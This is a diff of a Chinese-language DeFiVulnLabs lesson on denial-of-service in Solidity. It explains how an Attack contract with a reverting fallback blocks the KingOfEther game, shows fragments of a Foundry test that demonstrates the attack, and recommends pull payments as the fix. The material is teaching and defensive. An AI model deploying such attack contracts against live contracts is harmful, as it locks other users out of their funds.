@@ -1,15 +1,19 @@
-# 拒绝服务  
+# 拒绝服务攻击  
 [DOS.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/DOS.sol)  
-**名称：** 拒绝服务  
+**名称：** 拒绝服务攻击  
 KingOfEther合约有一个游戏，用户可以通过发送比当前余额更多的以太币来夺取王位。  
-当新用户发送更多以太币时，合约试图将之前的余额返还给最后一个“国王”。   
-然而，这个机制是有漏洞的。攻击者的合约（这里称为Attack合约）可以成为王者，然后使回退函数回滚或消耗超过规定的gas限制，每当KingOfEther合约试图将以太币返回给最后一个国王时，claimThrone函数就会失败。  
+当新用户发送更多以太币时，合约试图将之前的余额返还给上一位“国王”。   
+
+然而，这个机制可能被利用。攻击者的合约(这里称为Attack合约)可以成为国王，  
+然后使回退函数回滚或消耗超过规定的gas限制，从而导致KingOfEther合约在尝试将以太币返回给上一位国王时失败。
 
 
-**修复意见：**  
-使用“拉取”支付模式，防止这种情况的一种方法是使用户能够提取他们的以太币，而不是将其发送给他们。  
+**缓解措施：**  
+使用拉取支付模式。一种防止这种情况的方法是允许用户提取他们的以太币，而不是直接发送给他们。  
+
 **参考：**  
-https://slowmist.medium.com/intro-to-smart-contract-security-audit-dos-e23e9e901e26   
+https://slowmist.medium.com/intro-to-smart-contract-security-audit-dos-e23e9e901e26  
+
 **KingOfEther合约：**  
 ```
 contract KingOfEther {
@@ -30,9 +34,9 @@ contract KingOfEther {
 **如何测试：**  
 forge test --contracts src/test/DOS.sol -vvvv  
 ```
-// 此函数测试拒绝服务(DoS)攻击场景
+// 这是一个测试函数，用于执行DoS攻击的场景
 function testDOS() public {
-    // “Alice”和“Bob”是从以太坊虚拟机分配的地址值。
+    // 声明了两个地址，分别用于模拟用户Alice和Bob。
     address alice = vm.addr(1);
     address bob = vm.addr(2);
 
@@ -40,7 +44,7 @@ function testDOS() public {
     vm.deal(address(alice), 4 ether);
     vm.deal(address(bob), 2 ether);
 
-    // Alice的地址调用一些prank函数
+    // 使用Alice的地址调用prank函数
     vm.prank(alice);
 
     // Alice试图通过发送1个以太币来夺取KingOfEtherContract的王位
@@ -55,16 +59,17 @@ function testDOS() public {
     // 记录Alice在返回1个以太币后的余额
     console.log("Return 1 ETH to Alice, Alice of balance", address(alice).balance);
 
-    // 攻击合约被调用，用3个以太币攻击KingOfEtherContract合约
+    // 调用Attack合约的attack函数，发起DoS攻击，
+    // 向KingOfEther合约发送3个以太币。
     AttackerContract.attack{value: 3 ether}();
 
-    // 记录KingOfEtherContract合约的余额
+    // 记录KingOfEther合约的余额
     console.log("Balance of KingOfEtherContract", KingOfEtherContract.balance());
 
     // 记录一条消息，表明攻击已完成，Alice将无法再次夺取王位。
     console.log("Attack completed, Alice claimthrone again, she will fail");
 
-    // 使用Alice的地址再次调用prank函数，预期该过程需要回滚。
+    // 使用Alice的地址再次调用prank函数，预期会触发回滚。
     vm.prank(alice);
     vm.expectRevert("Failed to send Ether");
 
@@ -72,11 +77,11 @@ function testDOS() public {
     KingOfEtherContract.claimThrone{value: 4 ether}();
 }
 
-// 对KingOfEther合约发起DoS攻击的攻击合约
+// 这是用于实施DoS攻击的合约
 contract Attack {
     KingOfEther kingOfEther;
 
-    // 初始化KingOfEther合约的构造函数。
+    // 用于初始化KingOfEther合约的构造函数。
     constructor(KingOfEther _kingOfEther) {
         kingOfEther = KingOfEther(_kingOfEther);
     }
